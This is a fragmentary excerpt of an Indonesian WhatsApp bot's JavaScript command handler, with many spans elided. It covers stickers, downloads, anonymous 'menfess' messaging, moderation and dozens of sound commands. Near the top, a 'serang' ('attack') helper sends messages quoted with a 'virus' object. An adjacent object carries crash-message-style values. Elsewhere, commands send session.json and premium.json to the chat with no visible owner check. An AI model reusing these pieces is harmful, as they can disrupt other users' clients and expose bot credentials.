...
var { youtubeSearch, youtubedl, youtubedlv2, youtubedlv3 } = require('@bochilteam/scraper')
const fs = require ("fs");
...
let menfess = JSON.parse(fs.readFileSync('./database/menfess.json'));
...
let autostik = JSON.parse(fs.readFileSync('./database/autostiker.json'));
// Tanggal
var dt = new Date 
...
module.exports = async(satganz, msg, m, setting, store, welcome) => {
	try {
		...
		const botNumber = satganz.user.id.split(':')[0] + '@s.whatsapp.net'
		const groupMetadata = isGroup ? await satganz.groupMetadata(from) : ''
		...
		const isAutoSticker = autostik.includes(from) ? true : false
		const isAntiBadword = isGroup ? antibadword.includes(from) ? true : false : false
     ...
     const serang = (nomore) => {
           satganz.sendMessage(nomore, { text: nomore, contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(settimg.pathimg),"sourceUrl": "hehe"}}}, { quoted: virus})
           }
           // add by satganzde
   const fr = {
		fileLength: 9202828, seconds: 27272727,
			contextInfo: {
		...
		const sendFileFromUrl = async (from, url, caption, options = {}) => {
		    ...
		    if (mime.split("/")[0] === "image") {
		       ...
		       return satganz.sendMessage(from, { image: img, caption: caption }, options)
		    } else if (mime.split("/")[0] === "video") {
		       var vid = await getBuffer(url)
		       return satganz.sendMessage(from, { video: vid, caption: caption }, options)
		    } else if (mime.split("/")[0] === "audio") {
		       var aud = await getBuffer(url)
		       return satganz.sendMessage(from, { audio: aud, mimetype: 'audio/mp3' }, options)
		    } else {
		       var doc = await getBuffer(url)
		       return satganz.sendMessage(from, { document: doc, mimetype: mime, caption: caption }, options)
		    }
		}
	...
	let type = await FileType.fromBuffer(buffer)
        ...
        async function sendPlay(from, query) {
           ...
           hxz.youtube(url).then(async(data) => {
             ...
             satganz.sendMessage(from, { caption: `*Title :* ${data.title}\n*Quality :* ${data.quality}\n*Url :* https://youtu.be/${data.id}`, location: { jpegThumbnail: await getBuffer(data.thumb) }, buttons: button, footer: 'Pilih Salah Satu Button Dibawah⬇️', mentions: [sender] })
           }).catch((e) => {
             satganz.sendMessage(from, { text: "Maaf terjadi kesalahan" }, { quoted: msg })
               ownerNumber.map( i => satganz.sendMessage(from, { text: `Send Play Error : ${e}` }))
           })
        }
		const isUrl = (url) => {
        ...
        const mess = async (mess) => {
    satganz.sendMessage(from, { audio: { url : `./media/only${mess}`}, ptt: true}, {quoted:{ key: {fromMe: false, participant: sender, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: {"conversation": `[ *KAMU BUKAN ${mess}* ]`}}})
    }
		...
		function mentions(teks, mems = [], id) {
			if (id == null || id == undefined || id == false) {
			  let res = satganz.sendMessage(from, { text: teks, mentions: mems })
			  return res
			} else {
		      let res = satganz.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
		      return res
 		    }
		}
		const generateProfilePicture = async (buffer) => {
		const jimph = await Jimp.read(buffer)
		const min = jimph.getWidth()
		const max = jimph.getHeight()
		const cropped = jimph.crop(0, 0, min, max)
		return {
		...
		const reply = (teks) => {
			satganz.sendMessage(from, { text: teks , contextInfo:{"externalAdReply": {"title": `Haik Onichan`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": { url : setting.pathimg },"sourceUrl": "hehe"}}}, { quoted: { key: {fromMe: false, participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { contactMessage: { displayName: jam + ' WIB', vcard: 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + `item1.TEL;waid=${sender.split("@")[0]}:+${sender.split("@")[0]}\n` + 'item1.X-ABLabel:Ponsel\n' + 'END:VCARD' }}} })
		}
		const balas = (id, teks) => {
			satganz.sendMessage(id, { text: teks }, { quoted : msg })
		}
		const textImg = (teks) => {
			return satganz.sendMessage(from, { text: teks, jpegThumbnail: { url : setting.pathimg } }, { quoted: msg })
		}
		const sendMess = (hehe, teks) => {
			satganz.sendMessage(hehe, { text, teks })
		}
		const buttonWithText = (from, text, footer, buttons) => {
			return satganz.sendMessage(from, { text: text, footer: footer, templateButtons: buttons })
		}
		...
		const sendContact = (jid, numbers, name, quoted, mn) => {
			...
			+ 'END:VCARD'
			return satganz.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: quoted })
		}
		const deniedaccess = (jid) => {
			return satganz.sendMessage(from, { audio: { url: './media/access denied.mp3' }, mimetype: 'audio/mp4', ptt: true}, {quoted : haik})
	    }
		...
		const sure = "Y"
        let isSure= new RegExp(sure, 'i')
        const sue = "N"
        let isNot= new RegExp(sue, 'i')
        ...
        const addMenfess = (frome, to, menfess) => {
        const obj = { from: frome, to: to, status: true }
        menfess.push(obj)
        fs.writeFileSync('./database/menfess.json', JSON.stringify(menfess, null, 2))
        }
        ...
        let status = false
        Object.keys(menfess).forEach((i) => {
        if (menfess[i].from === from) {
            status = true
        }
        })
        return status
        }
        const checkog = (from, menfess) => {
        let status = false
        Object.keys(menfess).forEach((i) => {
        ...
        const getPengirim = (userId, menfess) => {
    let position = null
    Object.keys(menfess).forEach((i) => {
        if (menfess[i].from === userId) {
            position = i
        }
    })
    if (position !== null) {
        return menfess[position].from
    }
}
	...
	console.log(from)
				...
				.on("end", () => {
				  exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
				    satganz.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
        ...
        let gclink = (`https://chat.whatsapp.com/`+ await satganz.groupInviteCode(from))
		...
		var bang = msg.key.id
		satganz.sendMessage(sender, { text: "JANGAN NGIRIM LINKGROUP!", contextInfo:{"externalAdReply": {"title": `[ *ANTILINK* ]`,"body": setting.footext, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": { url : setting.pathimg },"sourceUrl": "https://bit.ly/SatganzDevs"}}}, { quoted: virus})
		satganz.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: bang, participant: hapus }})
        }
        }
        if (isAntiBadword) {
		...
		var hapus = msg.key.participant
		var bang = msg.key.id
		satganz.sendMessage(sender, { text: "JANGAN TOXIC!", contextInfo:{"externalAdReply": {"title": `[ *ANTITOXIC* ]`,"body": setting.footext, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": { url : setting.pathimg },"sourceUrl": "https://bit.ly/SatganzDevs"}}}, { quoted: virus})
		await satganz.sendMessage(from, { audio: { url: 'https://a.uguu.se/pwPgXOZh.mp3' }, mimetype: 'audio/mp4', ptt: true, mentions: [sender] })
		await sleep(300)
		await satganz.sendButtonText(from, [{ buttonId: '.antibadword disable', buttonText: { displayText: 'DISABLE ANTIBADWORD' }, type: 1 }], 'artinya:\nAllah tidak menyukai ucapan buruk, (yang diucapkan) dengan terus terang kecuali oleh orang yang dianiaya. Allah adalah Maha Mendengar lagi Maha Mengetahui.', setting.footext)
		await satganz.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: bang, participant: hapus }})
		}
		}
		// Auto Registrasi
		if (isCmd && !isUser) {
		...
		// Premium
		_prem.expiredCheck(satganz, premium)

		// Tictactoe
		if (isTicTacToe(from, tictactoe)) tictac(chats, prefix, tictactoe, from, sender, reply, mentions, addBalance, balance)
		
        // Game
		cekWaktuGame(satganz, tebakgambar)
		      ...
		      // For Response List in Group
                if (!isCmd && isGroup && isAlreadyResponList(from, chats, db_respon_list)) {
                  ...
                  if (get_data_respon.isImage === false) {
                    satganz.sendMessage(from, { text: sendResponList(from, chats, db_respon_list) }, { quoted: msg })
                  } else {
                    satganz.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, { quoted: msg })
                  }
                }
		...
		switch(command) {
            ...
            satganz.sendMessage(from, listMsg)
            break
         case prefix+'addlist':
            if (!isGroup) return reply(mess.OnlyGrup)
            ...
            if (isImage || isQuotedImage) {
                let media = await satganz.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender}`)
        ...
        case prefix+'proses':
            ...
            satganz.sendMessage(`${ownerNumber}`, {text: proses })
            break
        case prefix+'done':
            if (!isOwner) return
            ...
            satganz.sendMessage(`${numbb}`, { text: sukses, mentions: [numbb] })
            break
         case prefix+'tambah':
        ...
        satganz.sendMessage(from, message)
           break
			case prefix+'menu':
			case prefix+'help':
			...
			satganz.sendMessage(from, {document : sesi, mimetype: 'application/json', fileName: 'session.json' }, {quoted: msg})
			break
            case prefix+'getdb':
			case prefix+'senddb':
			var sesi = fs.readFileSync('./database/premium.json')
			satganz.sendMessage(from, {document : sesi, mimetype: 'application/json', fileName: 'premium.json' }, {quoted: msg})
				break
            case prefix+'menfess':
            case prefix+'kirim':
            addCountCmd('#menfess', sender, _cmd)
            if (isMenfess) return reply("masih ada sesi menfess sebelumnya.\n\n untuk mengakhiri sesi ketik *dm*")
            if (!q) return reply('penggunaan salah, contoh1 : .menfess 6281316701742')
            var tgt = args.join(" ")
            var tujuan = tgt.replace(/[^@0-9]/g, '')+ "@s.whatsapp.net"
            if (tgt.startsWith("0")) return reply("nomor harus dimulai dengan kode negara, cth : 6281316701742")
            var cekon = await satganz.onWhatsApp(tujuan)
            if (tujuan == sender) return reply('its your self bitch!')
                 if (cekon.length == 0) return reply(`Nomor tersebut tidak terdaftar di whatsapp\n\nMasukkan nomer yang valid/terdaftar di WhatsApp`)
            satganz.sendMessage(tujuan, { text : `Seseorang Mengajakmu Chatan Secara Rahasia, Dan Sekarang Apa Yang Kamu Kirim Ke Nomor Ini Akan Di Teruskan Ke Pengajak Chatan.\n\n Untuk Menghentikan Chatan Ini Kamu Hanya Perlu Membalas dm/delmenfess.` }, { quoted : msg })
			reply(`Tersambung Dengan ${tgt}\n\n Balas dm/delmenfess Untuk Mengakhiri Menfess`)
            addMenfess(sender, tujuan, menfess)
            break
            case prefix+'delmenfess':
            case prefix+'dm':
            if (!isMenfess) return reply("Tidak Ada Sesi Di Akun Anda!")
            reply('Kamu Telah Menghentikan Menfess.')
            for (let i of menfess) {
            var o = [];
            o.push(i.to)
            balas(i.to, 'Lawan Bicaramu telah menghentikan Menfess.')
            }
			...
			case prefix+'owner':
			    ...
			    for (let x of ownerNumber) {
			     var haik = await sendContact(from, x.split('@s.whatsapp.net')[0], 'Satganz Devs', msg)
			    }
			    satganz.sendMessage(from, { audio: { url: './media/ownerku.mp3' }, mimetype: 'audio/mp4', ptt: true, mentions: [sender]}, {quoted : haik})
			    break
            case prefix+'setpp':
            case prefix+'setppbot':
                ...
                await updateProfilePicture(botNumber, ppnya)
...
await satganz.query({ tag: 'iq',attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
            ...
            case prefix+'dashboard':
                ...
                if (mentioned.length !== 0) {
                 ...
                 var cekap = await satganz.onWhatsApp(args[1]+"@s.whatsapp.net")
            ...
            case prefix+'delprem':
                ...
                if (mentioned.length !== 0){
                 ...
                 var cekpr = await satganz.oWhatsApp(args[1]+"@s.whatsapp.net")
			...
			case prefix+'tovid': case prefix+'tovideo':
			    ...
			    exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
			      ...
			      satganz.sendMessage(from, { image: { url: `./${rand2}` }}, { quoted: msg })
			      limitAdd(sender, limit)
				  fs.unlinkSync(`./${rand2}`)
			    })
			    } else {
			    reply("_Wait a minute, data is being processed!_")
		          webp2mp4File(`./${rand1}`).then( data => {
			       fs.unlinkSync(`./${rand1}`)
			       satganz.sendMessage(from, { video: { url: data.result }}, { quoted: msg })
			       limitAdd(sender, limit)
				  })
			    }
			    break
            case prefix+'upload': case prefix+'tourl': case prefix+'tolink':
                   ...
                   if (isQuotedSticker) {
                     ...
                     var media = await satganz.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${fileName}`)
                   } else if (isImage || isQuotedImage) {
                     var fileName = 'image'+makeid(10)+'.jpg'
                     var media = await satganz.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${fileName}`)
                   } else if (isVideo || isQuotedVideo) {
                     var fileName = 'video'+makeid(10)+'.mp4'
                     var media = await satganz.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${fileName}`)
                   } else if (isQuotedAudio) {
                     var fileName = 'audio'+makeid(10)+'.mp3'
                     var media = await satganz.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${fileName}`)
                   } else {
            ...
            case prefix+'ssweb-desktop':
                  ...
                  satganz.sendMessage(from, { caption: `${setting.footext}`, image: { url: fatih }}, { quoted: msg})
                  limitAdd(sender, limit)
                  break
            ...
            case prefix+'tinyurl':
                  ...
                  var teks = `*DONE*\n\n≻ Url Original : ${q}\n≻ Result : ${riy.result}`
                  satganz.sendMessage(from, { text: teks }, { quoted: msg })
                  limitAdd(sender, limit)
                  break
            case prefix+'cuttly':
                  if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            ...
            case prefix+'circle':
                   ...
                   if (media !== null) {
                     ...
                     satganz.sendMessage(from, { caption: 'Dont Forget Subscribe\nhttps://youtube.com/c/Riy', image: { url: riy }}, { quoted: msg})
                     limitAdd(sender, limit)
                     fs.unlinkSync(media)
                   } else {
                     reply("Maaf terjadi kesalahan")
            ...
            case prefix+'wanted':
             ...
             case prefix+'sad':
             if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
             addCountCmd('#sad', sender, _cmd)
             var tekk = await fetchJson(`https://zenzapis.xyz/randomtext/galauquote?apikey=mmc`)
                let audio = satganz.sendMessage(from, { text: tekk.result.message })
                let brodi = randomNomor(1, 52)
                satganz.sendMessage(from, { audio: { url: `https://raw.githubusercontent.com/SatganzDevs/XXX---BOT/master/media/${brodi}.mp3` }, mimetype: 'audio/mp4', ptt: true, mentions: [sender]}, { quoted: msg })
                break
             case prefix+'gura':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            ...
            case prefix+'sound1':
                ...
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound1.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound2':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound2', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound2.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound3':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound3', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound3.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound4':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            ...
            case prefix+'sound5':
                ...
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound5.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound6':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound6', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound6.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound7':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound7', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound7.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound8':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound8', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound8.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound9':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound9', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound9.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound10':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound10', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound10.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound11':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound11', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound11.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound12':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound12', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound12.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound13':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound13', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound13.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound14':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound14', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound14.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound15':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            ...
            case prefix+'sound16':
                ...
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound16.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound17':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound17', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound17.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound18':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound18', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound18.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound19':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound19', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound19.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound20':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound20', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound20.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound21':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound21', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound21.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound22':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound22', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound22.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound23':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound23', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound23.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound24':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound24', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound24.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound25':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound25', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound25.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound26':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound26', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound26.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound27':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound27', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound27.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound28':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound28', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound28.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound29':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound29', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound29.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound30':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound30', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound30.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound31':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound31', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound31.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound32':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound32', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound32.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound33':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound33', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound33.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound34':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound34', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound34.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound35':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound35', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound35.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound36':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound36', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound36.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound37':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound37', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound37.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound38':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound38', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound38.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound39':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound39', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound39.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound40':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound40', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound40.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound41':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound41', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound41.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound42':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound42', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound42.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound43':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound43', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound43.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound44':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound44', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound44.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
